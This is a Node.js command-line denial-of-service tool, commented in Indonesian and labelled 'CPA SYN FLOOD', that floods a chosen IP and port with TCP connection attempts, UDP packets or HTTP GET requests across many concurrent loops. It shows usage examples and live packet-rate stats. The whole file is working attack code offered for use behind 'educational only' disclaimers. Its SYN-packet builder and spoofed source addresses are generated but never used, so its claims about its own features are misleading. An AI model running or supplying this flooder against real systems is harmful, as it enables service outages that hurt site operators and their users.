#!/usr/bin/env node

/*
==================================================
    ___   ___    _    ____   _   _   _____  
   / _ \ / _ \  / \  / ___| | | | | |  ___| 
  | | | | | | |/ _ \| |     | |_| | | |_    
  | |_| | |_| / ___ \ |___  |  _  | |  _|   
   \___/ \___/_/   \_\____| |_| |_| |_|     
                                            
  ====== CPA SYN FLOOD TOOL v1.0 ======
  ======    Ethical Security Tool    ======
==================================================
*/

// ========== LOGO KEPALA ELANG ==========
const logo = `
\033[93m
                    .-"-.
                   /     \\
                   |     |
                   \\.---./
                    )   (
                   /     \\
                  |       |
                  |   o   |
                  |   o   |
                  |   o   |
                  |       |
                  |       |
                  |       |
                  |       |
                  |       |
                  \\     /
                   \\   /
                    \\ /
                     '
\033[0m
\033[91m██╗░░░░░░███████╗░░░░░░░██████╗░██╗░░░░░░█████╗░░█████╗░██████╗░
██║░░░░░░██╔════╝░░░░░░░██╔══██╗██║░░░░░██╔══██╗██╔══██╗██╔══██╗
██║░░░░░░█████╗░░░░░░░░░██║░░██║██║░░░░░██║░░██║██║░░██║██████╔╝
██║░░░░░░██╔══╝░░░░░░░░░██║░░██║██║░░░░░██║░░██║██║░░██║██╔══██╗
███████╗███████╗███████╗██████╔╝███████╗╚█████╔╝╚█████╔╝██║░░██║
╚══════╝╚══════╝╚══════╝╚═════╝░╚══════╝░╚════╝░░╚════╝░╚═╝░░╚═╝
\033[93m═══════════════════════════════════════════════════════════════
     ░█████╗░██████╗░░█████╗░  ░██████╗██╗░░░██╗███╗░░██╗
     ██╔══██╗██╔══██╗██╔══██╗  ██╔════╝╚██╗░██╔╝████╗░██║
     ██║░░╚═╝██████╔╝██║░░██║  ╚█████╗░░╚████╔╝░██╔██╗██║
     ██║░░██╗██╔══██╗██║░░██║  ░╚═══██╗░░╚██╔╝░░██║╚████║
     ╚█████╔╝██║░░██║╚█████╔╝  ██████╔╝░░░██║░░░██║░╚███║
     ░╚════╝░╚═╝░░╚═╝░╚════╝░  ╚═════╝░░░░╚═╝░░░╚═╝░░╚══╝
\033[93m═══════════════════════════════════════════════════════════════
\033[92m      🔥 CPA SYN FLOOD - Ethical Security Testing 🔥
\033[96m        Author: CPA Security Team | Version: 2.0
\033[91m        ⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️
\033[0m
`;

// ========== DEPENDENCIES ==========
const dgram = require('dgram');
const net = require('net');
const os = require('os');
const readline = require('readline');

// ========== KONFIGURASI ==========
let targetIP = '';
let targetPort = 80;
let threads = 100;
let isRunning = true;
let packetCount = 0;
let startTime = null;

// Warna untuk console
const colors = {
    red: '\x1b[31m',
    green: '\x1b[32m',
    yellow: '\x1b[33m',
    blue: '\x1b[34m',
    magenta: '\x1b[35m',
    cyan: '\x1b[36m',
    white: '\x1b[37m',
    reset: '\x1b[0m'
};

// ========== FUNGSI BANTUAN ==========
function log(message, type = 'info') {
    const timestamp = new Date().toLocaleTimeString();
    const icons = {
        info: '📡',
        success: '✅',
        error: '❌',
        warning: '⚠️',
        attack: '🔥'
    };
    
    let color = colors.cyan;
    if (type === 'success') color = colors.green;
    if (type === 'error') color = colors.red;
    if (type === 'warning') color = colors.yellow;
    if (type === 'attack') color = colors.magenta;
    
    console.log(`${color}[${timestamp}] ${icons[type]} ${message}${colors.reset}`);
}

function showStats() {
    const elapsed = (Date.now() - startTime) / 1000;
    const pps = Math.floor(packetCount / elapsed);
    
    console.log(`\r${colors.yellow}📊 STATS: Packets: ${packetCount} | PPS: ${pps} | Duration: ${elapsed.toFixed(1)}s${colors.reset}`);
}

// ========== MEMBUAT PACKET SYN ==========
function createSYNPacket(sourceIP, sourcePort, destIP, destPort, sequenceNum) {
    // Membuat IP header sederhana
    const ipHeader = Buffer.alloc(20);
    ipHeader.writeUInt8(0x45, 0); // Version = 4, IHL = 5
    ipHeader.writeUInt16BE(40, 2); // Total length
    ipHeader.writeUInt16BE(sequenceNum, 4); // ID
    ipHeader.writeUInt16BE(0x4000, 6); // Flags
    ipHeader.writeUInt8(64, 8); // TTL
    ipHeader.writeUInt8(6, 9); // Protocol = TCP
    ipHeader.writeUInt16BE(0, 10); // Checksum (akan dihitung)
    
    // Source IP
    const srcParts = sourceIP.split('.');
    for (let i = 0; i < 4; i++) {
        ipHeader.writeUInt8(parseInt(srcParts[i]), 12 + i);
    }
    
    // Destination IP
    const dstParts = destIP.split('.');
    for (let i = 0; i < 4; i++) {
        ipHeader.writeUInt8(parseInt(dstParts[i]), 16 + i);
    }
    
    // TCP Header
    const tcpHeader = Buffer.alloc(20);
    tcpHeader.writeUInt16BE(sourcePort, 0); // Source port
    tcpHeader.writeUInt16BE(destPort, 2); // Destination port
    tcpHeader.writeUInt32BE(sequenceNum, 4); // Sequence number
    tcpHeader.writeUInt32BE(0, 8); // ACK number
    tcpHeader.writeUInt8(0x50, 12); // Data offset
    tcpHeader.writeUInt8(0x02, 13); // Flags (SYN)
    tcpHeader.writeUInt16BE(8192, 14); // Window
    tcpHeader.writeUInt16BE(0, 16); // Checksum
    tcpHeader.writeUInt16BE(0, 18); // Urgent pointer
    
    return Buffer.concat([ipHeader, tcpHeader]);
}

// ========== SERANGAN TCP SYN ==========
async function tcpSynFlood(threadId) {
    const spoofedIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    const sourcePort = Math.floor(Math.random() * 65535);
    const sequenceNum = Math.floor(Math.random() * 4294967295);
    
    try {
        const socket = new net.Socket();
        socket.setTimeout(100);
        
        socket.on('error', (err) => {
            // Abaikan error, itu yang diinginkan untuk SYN flood
            packetCount++;
            if (packetCount % 1000 === 0) showStats();
        });
        
        socket.connect(targetPort, targetIP, () => {
            socket.destroy();
            packetCount++;
            if (packetCount % 1000 === 0) showStats();
        });
        
        setTimeout(() => {
            try { socket.destroy(); } catch(e) {}
        }, 50);
        
    } catch(err) {
        packetCount++;
    }
    
    if (isRunning) {
        setImmediate(() => tcpSynFlood(threadId));
    }
}

// ========== SERANGAN UDP FLOOD ==========
async function udpFlood(threadId) {
    const client = dgram.createSocket('udp4');
    const payload = Buffer.alloc(1024, 'X');
    const spoofedIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    
    try {
        client.send(payload, targetPort, targetIP, (err) => {
            if (!err) packetCount++;
            client.close();
            if (packetCount % 1000 === 0) showStats();
        });
    } catch(err) {
        packetCount++;
    }
    
    if (isRunning) {
        setImmediate(() => udpFlood(threadId));
    }
}

// ========== SERANGAN HTTP REQUEST ==========
async function httpFlood(threadId) {
    const httpClient = net.createConnection(targetPort, targetIP, () => {
        const request = `GET / HTTP/1.1\r\nHost: ${targetIP}\r\nUser-Agent: CPA-Bot/${Math.random()}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n`;
        httpClient.write(request);
        packetCount++;
        if (packetCount % 1000 === 0) showStats();
    });
    
    httpClient.on('error', () => {});
    httpClient.setTimeout(100, () => httpClient.destroy());
    
    if (isRunning) {
        setTimeout(() => httpFlood(threadId), 1);
    }
}

// ========== MENAMPILKAN BANNER ==========
function showBanner() {
    console.clear();
    console.log(logo);
    console.log(`${colors.cyan}┌─────────────────────────────────────────────────────────────┐${colors.reset}`);
    console.log(`${colors.cyan}│${colors.yellow}  🦅 CPA SECURITY TEAM - ADVANCED NETWORK TESTING SUITE     ${colors.cyan}│${colors.reset}`);
    console.log(`${colors.cyan}│${colors.white}  🔥 Mode: SYN Flood | UDP Flood | HTTP Flood               ${colors.cyan}│${colors.reset}`);
    console.log(`${colors.cyan}│${colors.green}  ✅ Legal Use Only | Authorized Testing Required           ${colors.cyan}│${colors.reset}`);
    console.log(`${colors.cyan}└─────────────────────────────────────────────────────────────┘${colors.reset}`);
    console.log('');
}

// ========== MENAMPILKAN BANTUAN ==========
function showHelp() {
    console.log(`
${colors.yellow}📖 PENGGUNAAN CPA SYN FLOOD:${colors.reset}

${colors.green}Cara menjalankan:${colors.reset}
  node cpa_syn_flood.js [IP] [PORT] [THREADS] [METHOD]

${colors.green}Parameter:${colors.reset}
  IP       - Target IP address (required)
  PORT     - Target port (default: 80)
  THREADS  - Jumlah threads (default: 100)
  METHOD   - tcp, udp, atau http (default: tcp)

${colors.green}Contoh:${colors.reset}
  node cpa_syn_flood.js 192.168.1.1 80 50 tcp
  node cpa_syn_flood.js 10.0.0.1 443 100 http
  node cpa_syn_flood.js 172.16.0.1 8080 200 udp

${colors.red}⚠️  PERINGATAN:${colors.reset}
  Hanya untuk testing pada sistem milik sendiri!
  Penggunaan tanpa izin adalah tindakan ILEGAL!
    `);
}

// ========== MAIN FUNCTION ==========
async function main() {
    showBanner();
    
    // Parse arguments
    const args = process.argv.slice(2);
    
    if (args.length === 0 || args[0] === '--help' || args[0] === '-h') {
        showHelp();
        process.exit(0);
    }
    
    targetIP = args[0];
    targetPort = parseInt(args[1]) || 80;
    threads = parseInt(args[2]) || 100;
    const method = (args[3] || 'tcp').toLowerCase();
    
    // Validasi input
    const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    
    if (!ipRegex.test(targetIP)) {
        log('IP address tidak valid!', 'error');
        process.exit(1);
    }
    
    if (targetPort < 1 || targetPort > 65535) {
        log('Port harus antara 1-65535!', 'error');
        process.exit(1);
    }
    
    if (threads < 1 || threads > 500) {
        log('Threads harus antara 1-500!', 'error');
        process.exit(1);
    }
    
    // Konfirmasi
    console.log(`${colors.yellow}┌─────────────────────────────────────────────┐${colors.reset}`);
    console.log(`${colors.yellow}│${colors.white}  TARGET CONFIGURATION                        ${colors.yellow}│${colors.reset}`);
    console.log(`${colors.yellow}├─────────────────────────────────────────────┤${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Target IP   : ${colors.green}${targetIP}${colors.yellow}                         │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Target Port : ${colors.green}${targetPort}${colors.yellow}                              │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Threads     : ${colors.green}${threads}${colors.yellow}                                 │${colors.reset}`);
    console.log(`${colors.yellow}│${colors.cyan}  Method      : ${colors.green}${method.toUpperCase()}${colors.yellow}                                 │${colors.reset}`);
    console.log(`${colors.yellow}└─────────────────────────────────────────────┘${colors.reset}`);
    console.log('');
    
    log('PERINGATAN: Hanya untuk testing legal!', 'warning');
    log('Serangan akan dimulai dalam 5 detik...', 'info');
    
    // Countdown
    for (let i = 5; i > 0; i--) {
        process.stdout.write(`\r${colors.red}Memulai dalam ${i} detik... Tekan Ctrl+C untuk batal${colors.reset}`);
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    console.log('');
    
    startTime = Date.now();
    
    // Pilih metode serangan
    let attackFunction;
    switch(method) {
        case 'udp':
            attackFunction = udpFlood;
            log(`Memulai UDP Flood attack ke ${targetIP}:${targetPort}`, 'attack');
            break;
        case 'http':
            attackFunction = httpFlood;
            log(`Memulai HTTP Flood attack ke http://${targetIP}:${targetPort}`, 'attack');
            break;
        default:
            attackFunction = tcpSynFlood;
            log(`Memulai TCP SYN Flood attack ke ${targetIP}:${targetPort}`, 'attack');
    }
    
    // Jalankan threads
    log(`Mengaktifkan ${threads} threads...`, 'info');
    
    for (let i = 0; i < threads; i++) {
        attackFunction(i);
    }
    
    // Monitor stats setiap detik
    const statsInterval = setInterval(() => {
        if (isRunning) {
            showStats();
        }
    }, 1000);
    
    // Handle Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n');
        log('Menghentikan serangan...', 'warning');
        isRunning = false;
        clearInterval(statsInterval);
        
        const elapsed = (Date.now() - startTime) / 1000;
        const avgPPS = Math.floor(packetCount / elapsed);
        
        console.log(`\n${colors.green}════════════════════════════════════════════${colors.reset}`);
        log(`SERANGAN DIHENTIKAN`, 'success');
        log(`Total Paket Terkirim: ${packetCount}`, 'success');
        log(`Durasi: ${elapsed.toFixed(2)} detik`, 'success');
        log(`Rata-rata PPS: ${avgPPS}`, 'success');
        console.log(`${colors.green}════════════════════════════════════════════${colors.reset}`);
        
        setTimeout(() => process.exit(0), 1000);
    });
    
    // Jalankan selama 60 detik lalu stop (opsional)
    setTimeout(() => {
        if (isRunning) {
            console.log('\n');
            log('Durasi maksimum tercapai (60 detik), menghentikan...', 'warning');
            process.emit('SIGINT');
        }
    }, 60000);
}

// Run
if (require.main === module) {
    main().catch(console.error);
}

module.exports = { tcpSynFlood, udpFlood, httpFlood };
